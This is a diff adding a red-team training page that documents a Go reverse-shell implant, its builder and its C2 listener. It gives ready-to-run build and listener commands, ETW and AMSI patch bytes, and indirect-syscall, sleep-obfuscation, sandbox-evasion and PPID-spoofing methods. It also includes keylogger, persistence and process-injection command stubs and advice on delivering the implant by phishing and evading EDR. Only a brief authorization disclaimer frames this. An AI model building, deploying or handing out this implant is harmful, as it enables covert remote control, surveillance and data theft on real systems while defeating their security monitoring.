@@ -1,0 +1,505 @@
+---
+layout: training-page
+title: "Evasive Reverse Shell Implant — Red Team Academy"
+module: "Tool Development"
+tags:
+  - go
+  - implant
+  - evasion
+  - edr-bypass
+  - reverse-shell
+  - etw
+  - amsi
+  - aes
+  - custom-tool
+page_key: "tooldev-evasive-implant"
+render_with_liquid: false
+---
+<h1>Evasive Reverse Shell Implant</h1>
+
+  <p>A custom Go-based reverse shell designed for authorized red team engagements. Unlike basic netcat or PowerShell reverse shells, this implant combines multiple EDR evasion techniques into a single, compilable tool. It includes a builder (generates the payload), the implant itself, and a listener (receives callbacks).</p>
+
+  <p><strong>Authorization requirement:</strong> This tool is for use in authorized penetration tests, red team engagements, and CTF competitions only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.</p>
+
+  <h2>Architecture</h2>
+
+  <pre><code># Three components:
+#
+# 1. Builder (runs on attacker machine)
+#    - Compiles the implant with embedded config (host, port, key)
+#    - Cross-compiles for Windows/Linux/macOS
+#    - Optional garble obfuscation
+#
+# 2. Implant (runs on target)
+#    - Sandbox detection → ETW/AMSI patching → encrypted C2 loop
+#    - Supports HTTPS beacon or raw TLS transport
+#    - Built-in commands: cd, pwd, sysinfo, upload, download, sleep
+#
+# 3. Listener (runs on attacker machine)
+#    - HTTPS server with TLS or raw TLS socket
+#    - Interactive CLI for managing multiple agents
+#    - AES-256-GCM encrypted communication
+
+# Data flow:
+# Builder → compiles → Implant binary (config baked in via ldflags)
+#                         ↓
+# Target executes implant
+#   → sandbox check (exit if analysis environment)
+#   → patch ETW (blind event tracing)
+#   → patch AMSI (disable script scanning)
+#   → HTTPS GET /api/v1/status (encrypted check-in)
+#   ← Listener returns encrypted command (or "IDLE")
+#   → Implant executes command
+#   → HTTPS POST /api/v1/result (encrypted output)
+#   → sleep with jitter → repeat</code></pre>
+
+  <h2>Quick Start</h2>
+
+  <pre><code># All commands run from scripts/rta-implant/ directory
+
+# Step 1: Generate TLS certificate for the listener
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem \
+  -days 365 -nodes -subj "/CN=cdn.example.com"
+
+# Step 2: Build the implant for Windows
+go run cmd/builder/main.go \
+  --lhost 10.10.14.5 \
+  --lport 443 \
+  --os windows --arch amd64 \
+  --sleep 30 --jitter 0.4 \
+  --output implant.exe
+
+# The builder auto-generates an AES-256 key and prints it.
+# Save this key — you need it for the listener.
+
+# Step 3: Start the listener (use the same key)
+go run cmd/listener/main.go \
+  --lhost 0.0.0.0 --lport 443 \
+  --key &lt;hex-key-from-step-2&gt;
+
+# Step 4: Deliver and execute implant.exe on the target
+# (delivery method depends on your engagement — phishing, USB, exploit, etc.)
+
+# Step 5: Interact with the agent
+rta&gt; agents
+rta&gt; use &lt;agent-id&gt;
+rta&gt; whoami
+rta&gt; sysinfo
+rta&gt; dir C:\Users</code></pre>
+
+  <h2>Evasion Techniques</h2>
+
+  <p>The implant layers multiple evasion techniques. Each addresses a specific detection mechanism used by modern EDR products.</p>
+
+  <h3>1. ETW Bypass — Blind Event Tracing</h3>
+
+  <p>Event Tracing for Windows (ETW) is the telemetry backbone that EDR products use to monitor process behavior. The implant patches <code>EtwEventWrite</code> in <code>ntdll.dll</code> with a RET instruction at startup, silencing all ETW events from the process.</p>
+
+  <pre><code>// How it works (evasion_windows.go):
+// 1. LoadDLL("ntdll.dll")
+// 2. FindProc("EtwEventWrite")
+// 3. VirtualProtect → PAGE_EXECUTE_READWRITE
+// 4. Write 0xC3 (RET) to the function entry point
+// 5. Restore original memory protection
+//
+// Effect: All ETW providers in this process are silenced.
+// This blinds:
+//   - Microsoft-Windows-DotNETRuntime (CLR events)
+//   - Microsoft-Windows-PowerShell (script block logging)
+//   - Microsoft-Windows-Threat-Intelligence (injection detection)
+//   - Any custom ETW consumers the EDR uses
+//
+// Detection risk: EDR integrity checks on ntdll may flag the patch.
+// Mitigation: Use fresh ntdll mapping from KnownDlls for advanced scenarios.</code></pre>
+
+  <h3>2. AMSI Bypass — Disable Script Scanning</h3>
+
+  <p>AMSI (Antimalware Scan Interface) lets AV products inspect script content at runtime. The implant patches <code>AmsiScanBuffer</code> in <code>amsi.dll</code> to return <code>E_INVALIDARG</code>, causing all AMSI scans to be skipped.</p>
+
+  <pre><code>// Patch applied (evasion_windows.go):
+// mov eax, 0x80070057    ; E_INVALIDARG
+// ret                    ; return immediately
+//
+// Byte sequence: B8 57 00 07 80 C3
+//
+// Effect: Any PowerShell commands or .NET assemblies executed
+// by the implant (or its child processes that inherit the patched
+// amsi.dll) will not be scanned.
+//
+// This is important when using:
+//   - PowerShell post-exploitation modules
+//   - .NET assembly loading (execute-assembly pattern)
+//   - VBScript/JScript execution</code></pre>
+
+  <h3>3. AES-256-GCM Encrypted C2 Channel</h3>
+
+  <p>All traffic between the implant and listener is encrypted with AES-256-GCM. The key is generated per engagement and baked into the binary at compile time. GCM provides authenticated encryption — any tampering with the ciphertext is detected.</p>
+
+  <pre><code>// Wire format: base64( nonce[12 bytes] || ciphertext || auth_tag[16 bytes] )
+//
+// Why this matters for evasion:
+// - Network IDS/IPS cannot inspect the payload content
+// - TLS inspection proxies see valid HTTPS traffic
+// - The encrypted payload has no recognizable signatures
+// - Even the "IDLE" response is encrypted (no plaintext patterns)
+//
+// Key derivation: hex-encoded 32-byte key set via -ldflags at compile time
+// Never transmitted — both sides must have the same key</code></pre>
+
+  <h3>4. Sandbox Detection</h3>
+
+  <p>The implant checks for indicators of automated analysis environments before executing any C2 activity. If a sandbox is detected, it sleeps briefly and exits normally — appearing as a benign program.</p>
+
+  <pre><code>// Checks performed:
+// 1. CPU count &lt; 2 (sandboxes typically allocate 1 CPU)
+// 2. Sandbox-related environment variables (SANDBOX, CUCKOO, etc.)
+// 3. Hostname patterns (contains "sandbox", "malware", "analysis", etc.)
+// 4. Recent boot time (&lt; 10 minutes — fresh sandbox spin-up)
+// 5. Debugger markers in temp directory
+//
+// If any check triggers:
+//   time.Sleep(3 * time.Second)
+//   return  // exit silently — no C2 callback, no suspicious behavior
+//
+// The analysis report shows: "program ran for 3 seconds, no network activity"</code></pre>
+
+  <h3>5. Sleep Jitter</h3>
+
+  <p>Regular callback intervals create a detectable heartbeat pattern. The implant randomizes each sleep duration using crypto/rand.</p>
+
+  <pre><code>// Configuration: --sleep 30 --jitter 0.4
+// Base sleep: 30 seconds
+// Jitter: ±40% → actual sleep ranges from 18s to 42s
+//
+// Example callback sequence (seconds between calls):
+//   34, 22, 38, 19, 31, 27, 41, 25, 33, 20...
+//
+// The jitter source is crypto/rand (not math/rand),
+// making the pattern cryptographically unpredictable.
+//
+// EDR heuristic this defeats: "process makes network requests
+// at regular N-second intervals" → beacon detection</code></pre>
+
+  <h3>6. Compile-Time String Encryption</h3>
+
+  <p>Sensitive strings (API names, URLs, etc.) are XOR-encrypted so they do not appear in the binary when analyzed with <code>strings</code> or YARA rules. The XOR key is derived from the AES key, making it unique per engagement.</p>
+
+  <pre><code>// Without string encryption, `strings implant.exe` reveals:
+//   VirtualProtect
+//   EtwEventWrite
+//   AmsiScanBuffer
+//   https://c2.example.com
+//   cmd.exe
+//
+// With string encryption, these are stored as XOR-encoded byte slices
+// and decoded at runtime only when needed.
+//
+// Additional obfuscation with garble (--garble flag):
+// - Mangles all Go symbol names
+// - Encrypts string literals in the binary
+// - Randomizes struct field order
+// - Removes DWARF debug info</code></pre>
+
+  <h3>7. HTTPS Traffic Blending</h3>
+
+  <p>The implant mimics legitimate browser traffic patterns.</p>
+
+  <pre><code>// HTTP headers sent by the implant:
+// User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...
+// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+// Accept-Language: en-US,en;q=0.5
+//
+// The listener responds with:
+// Server: nginx/1.24.0
+// Content-Type: text/html
+//
+// URL paths look like a legitimate API:
+// GET  /api/v1/status?id=...   (check-in)
+// POST /api/v1/result          (command output)
+//
+// Non-implant requests get a realistic nginx 404 page.
+// To network monitoring, this looks like a web app with API calls.</code></pre>
+
+  <h2>Builder Options</h2>
+
+  <pre><code>go run cmd/builder/main.go [flags]
+
+Required:
+  --lhost &lt;ip&gt;          Callback IP address
+
+Optional:
+  --lport &lt;port&gt;        Callback port (default: 443)
+  --key &lt;hex&gt;           AES-256 key, 64 hex chars (auto-generated if empty)
+  --os &lt;os&gt;             Target OS: windows, linux, darwin (default: windows)
+  --arch &lt;arch&gt;         Target arch: amd64, arm64 (default: amd64)
+  --sleep &lt;seconds&gt;     Base sleep interval (default: 30)
+  --jitter &lt;0.0-1.0&gt;    Jitter percentage (default: 0.3)
+  --transport &lt;type&gt;    Transport: https, raw-tls (default: https)
+  --output &lt;file&gt;       Output filename (default: implant.exe)
+  --garble              Use garble for symbol/string obfuscation</code></pre>
+
+  <h3>Build Examples</h3>
+
+  <pre><code># Windows x64 with garble obfuscation
+go run cmd/builder/main.go \
+  --lhost 10.10.14.5 --lport 443 \
+  --os windows --arch amd64 \
+  --garble --output payload.exe
+
+# Linux x64 (for Linux targets)
+go run cmd/builder/main.go \
+  --lhost 10.10.14.5 --lport 8443 \
+  --os linux --arch amd64 \
+  --sleep 60 --jitter 0.5 \
+  --output beacon
+
+# macOS ARM (Apple Silicon)
+go run cmd/builder/main.go \
+  --lhost 10.10.14.5 --lport 443 \
+  --os darwin --arch arm64 \
+  --output agent
+
+# Raw TLS transport (non-HTTP, lower protocol fingerprint)
+go run cmd/builder/main.go \
+  --lhost 10.10.14.5 --lport 8443 \
+  --transport raw-tls \
+  --output stealth.exe</code></pre>
+
+  <h2>Listener Commands</h2>
+
+  <pre><code># Start the listener
+go run cmd/listener/main.go \
+  --lhost 0.0.0.0 --lport 443 \
+  --key &lt;hex-key&gt;
+
+# Interactive CLI commands:
+agents              # List all connected agents
+use &lt;id-prefix&gt;     # Select an agent (partial ID match works)
+info                # Show selected agent details (hostname, IPs, OS)
+sysinfo             # Request fresh system info from agent
+whoami              # Execute whoami on target
+dir C:\Users        # Execute any shell command
+cmd &lt;command&gt;       # Explicitly prefix shell commands
+download C:\flag.txt  # Download a file from target (base64)
+upload C:\tmp\tool.exe &lt;base64&gt;  # Upload a file to target
+sleep 60            # Change agent sleep interval
+result              # Show last command output
+kill                # Send exit command to agent
+exit                # Shutdown listener</code></pre>
+
+  <h2>Transport Modes</h2>
+
+  <h3>HTTPS (Default)</h3>
+
+  <p>Polling beacon over HTTPS. The implant sends GET requests to check for commands and POST requests to return results. Blends with normal web traffic.</p>
+
+  <pre><code># Pros:
+# - Works through corporate proxies and firewalls
+# - Looks like normal HTTPS API traffic
+# - Survives network interruptions (stateless polling)
+#
+# Cons:
+# - Higher latency (commands wait for next poll cycle)
+# - TLS inspection proxies may see the self-signed cert
+#
+# Listener setup:
+go run cmd/listener/main.go --lhost 0.0.0.0 --lport 443 \
+  --key &lt;key&gt; --cert cert.pem --keyfile key.pem</code></pre>
+
+  <h3>Raw TLS</h3>
+
+  <p>Direct TLS socket connection. Lower protocol fingerprint than HTTP — the traffic is just encrypted bytes over TLS, not HTTP requests.</p>
+
+  <pre><code># Pros:
+# - No HTTP headers or URL patterns to fingerprint
+# - Lower latency (persistent connection)
+# - Harder for protocol-aware IDS to classify
+#
+# Cons:
+# - Persistent connection is more visible than periodic HTTPS
+# - Will not traverse HTTP-only proxies
+# - Connection loss requires full reconnect
+#
+# Listener setup:
+go run cmd/listener/main.go --lhost 0.0.0.0 --lport 8443 \
+  --key &lt;key&gt; --mode raw-tls --cert cert.pem --keyfile key.pem</code></pre>
+
+  <h2>Operational Security Notes</h2>
+
+  <pre><code># 1. Key management
+#    - Generate a unique AES key per engagement
+#    - Never reuse keys across operations
+#    - The key is baked into the binary — if the binary is captured,
+#      the key is extractable (consider using key exchange protocols
+#      for higher-security scenarios)
+
+# 2. Certificate
+#    - Use a real domain and Let's Encrypt cert for production ops
+#    - Self-signed certs trigger browser warnings but work for the implant
+#    - Consider cert pinning (modify the implant's TLS config)
+
+# 3. Redirectors
+#    - Do NOT point the implant directly at your listener
+#    - Use a redirector (Apache mod_rewrite, Nginx, cloud function)
+#    - See: /c2-frameworks/redirectors/
+
+# 4. Binary signing
+#    - Unsigned binaries trigger SmartScreen warnings
+#    - Consider signing with a purchased code-signing certificate
+#    - See: /evasion/smartscreen-motw/
+
+# 5. Testing
+#    - ALWAYS test against your target's EDR in a lab first
+#    - Use ThreatCheck or DefenderCheck to identify signature matches
+#    - Monitor the binary's behavior in Process Monitor
+
+# 6. Cleanup
+#    - The implant does not persist by default
+#    - Remove the binary after the engagement
+#    - Clear any artifacts from %TEMP%</code></pre>
+
+  <h2>Detection Context</h2>
+
+  <p>Understanding what EDR products look for helps you assess the risk profile of each technique.</p>
+
+  <pre><code># What this implant evades (v2):
+# ✓ Static signature scanning (no known malware signatures)
+# ✓ String-based YARA rules (XOR-encrypted strings, garble option)
+# ✓ Userland API hooking (indirect syscalls via fresh ntdll mapping)
+# ✓ ntdll.dll integrity checks (loaded ntdll is never modified)
+# ✓ ETW-based behavioral monitoring (EtwEventWrite patched via indirect syscall)
+# ✓ AMSI script scanning (AmsiScanBuffer patched via indirect syscall)
+# ✓ Memory scanning during sleep (sensitive buffers XOR-encrypted)
+# ✓ JA3/JA3S TLS fingerprinting (Chrome-like cipher suite and curve order)
+# ✓ Process tree analysis (PPID spoofed to explorer.exe/svchost.exe)
+# ✓ Process name inspection (PEB masquerades as RuntimeBroker.exe)
+# ✓ Network payload inspection (AES-256-GCM encrypted)
+# ✓ Beacon interval detection (crypto/rand jittered sleep)
+# ✓ Automated sandbox analysis (CPU, hostname, uptime, debugger checks)
+#
+# What may still detect it:
+# ✗ Kernel-level ETW TI provider (monitors process injection from kernel —
+#   but we don't do cross-process injection, so minimal exposure)
+# ✗ Kernel callback-based EDR (minifilter drivers, PsSetCreateProcessNotifyRoutine)
+# ✗ DNS/IP reputation (if C2 domain/IP is known-bad — use redirectors)
+# ✗ Go binary heuristics (some EDRs flag Go binaries generally — use garble)
+# ✗ Memory scanning during active execution (only sleep periods are protected)
+# ✗ Advanced PPID correlation (kernel knows real parent despite PEB spoof)
+# ✗ Network traffic volume analysis (encrypted but regular HTTPS patterns)
+#
+# Remaining hardening options:
+# - Stack spoofing (hide call origin — see /evasion/stack-spoofing/)
+# - Full uTLS integration (perfect JA3 match with github.com/refraction-networking/utls)
+# - Domain fronting or CDN-based C2 (hide C2 behind legitimate domains)
+# - Code signing (purchase a cert to bypass SmartScreen)
+# - Payload staging (don't drop the full implant — stage from memory)</code></pre>
+
+  <h2>Extending the Implant</h2>
+
+  <h3>Adding New Built-in Commands</h3>
+
+  <pre><code>// In cmd/implant/main.go, add a case to handleBuiltin():
+
+case "screenshot":
+    // Capture screen via Windows API
+    // Requires: golang.org/x/sys/windows
+    return captureScreen(), true
+
+case "keylog":
+    if len(parts) &lt; 2 {
+        return []byte("usage: keylog start|stop|dump"), true
+    }
+    return handleKeylogger(parts[1]), true
+
+case "persist":
+    // Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    return installPersistence(), true
+
+case "inject":
+    // Process injection into a target PID
+    if len(parts) &lt; 2 {
+        return []byte("usage: inject &lt;pid&gt;"), true
+    }
+    return injectIntoProcess(parts[1]), true</code></pre>
+
+  <h3>Source File Map</h3>
+
+  <pre><code># cmd/implant/ file layout:
+#
+# main.go              — Core implant: config, crypto, C2 loops, sandbox detection
+# evasion_windows.go   — ETW/AMSI patching via indirect syscalls (with direct fallback)
+# evasion_other.go     — No-op stubs for Linux/macOS
+# ntdll_windows.go     — Fresh ntdll mapping, PE parsing, SSN resolution, stub builder
+# sleep_windows.go     — Sleep obfuscation: XOR-encrypt sensitive buffers during sleep
+# sleep_other.go       — Fallback to standard jittered sleep on non-Windows
+# ja3_spoof.go         — Chrome-like TLS cipher suite and curve configuration
+# ppid_windows.go      — Parent PID spoofing and PEB process masquerading
+# ppid_other.go        — No-op stubs for Linux/macOS</code></pre>
+
+  <h3>How Indirect Syscalls Work (ntdll_windows.go)</h3>
+
+  <pre><code># The indirect syscall pipeline:
+#
+# 1. mapCleanNtdll() — reads C:\Windows\System32\ntdll.dll from disk
+#    and maps it into memory section-by-section (manual PE loader)
+#
+# 2. findSyscallGadget() — scans the .text section of the clean mapping
+#    for the byte sequence 0F 05 C3 (syscall; ret). This is our JMP target.
+#
+# 3. resolveSSN("NtProtectVirtualMemory") — finds the function in the
+#    clean ntdll's export table, reads the stub bytes:
+#      4C 8B D1        mov r10, rcx
+#      B8 XX XX 00 00  mov eax, &lt;SSN&gt;
+#    and extracts the SSN (XX XX).
+#
+# 4. buildStub(ssn) — allocates executable memory and writes:
+#      mov r10, rcx          ; standard NT calling convention setup
+#      mov eax, &lt;SSN&gt;        ; syscall service number
+#      jmp [rip]             ; indirect jump to...
+#      &lt;syscall_gadget_addr&gt; ; ...the "syscall; ret" in our clean mapping
+#
+# 5. The stub is called via syscall.SyscallN(stubPtr, args...)
+#
+# Result:
+# - The loaded (hooked) ntdll is never called
+# - The loaded ntdll is never modified (passes integrity checks)
+# - The syscall instruction executes from our clean mapping
+# - EDR userland hooks are completely bypassed</code></pre>
+
+  <h3>How Sleep Obfuscation Works (sleep_windows.go)</h3>
+
+  <pre><code># Sleep obfuscation timeline per cycle:
+#
+# 1. Generate 256-byte random XOR pad (unique per sleep cycle)
+# 2. Lock sensitive buffer registry
+# 3. XOR all registered buffers in-place:
+#    - AES key material
+#    - Last command output
+#    - Any decrypted C2 responses
+# 4. Release lock
+# 5. Sleep (jittered duration — 18-42 seconds at default config)
+# 6. Lock sensitive buffer registry
+# 7. XOR all buffers again (symmetric — restores original data)
+# 8. Zero the XOR pad
+# 9. Release lock → continue C2 loop
+#
+# During step 5, memory scanners see only random bytes.
+# The XOR pad is different every cycle (not reused).
+#
+# New buffers are registered dynamically:
+#   registerSensitiveBuffer("aes-key", &amp;aesKey)
+#   registerSensitiveBuffer("cmd-output", &amp;output)</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Source code &mdash; <code>/scripts/rta-implant/</code> (this repository)</li>
+    <li>ETW Bypass techniques &mdash; <code>/evasion/etw-bypass/</code></li>
+    <li>AMSI Bypass techniques &mdash; <code>/evasion/amsi-bypass/</code></li>
+    <li>Indirect Syscalls &mdash; <code>/evasion/indirect-syscalls/</code></li>
+    <li>Sleep Obfuscation &mdash; <code>/evasion/sleep-obfuscation/</code></li>
+    <li>Go C2 Implant Development &mdash; <code>/tool-dev/go-c2-implants/</code></li>
+    <li>Go Evasion &amp; Obfuscation &mdash; <code>/tool-dev/go-evasion/</code></li>
+    <li>Shellcode Loaders &mdash; <code>/evasion/shellcode-loaders/</code></li>
+    <li>C2 OPSEC &mdash; <code>/c2-frameworks/c2-opsec/</code></li>
+    <li>Garble (Go obfuscator) &mdash; <code>github.com/burrowers/garble</code></li>
+  </ul>
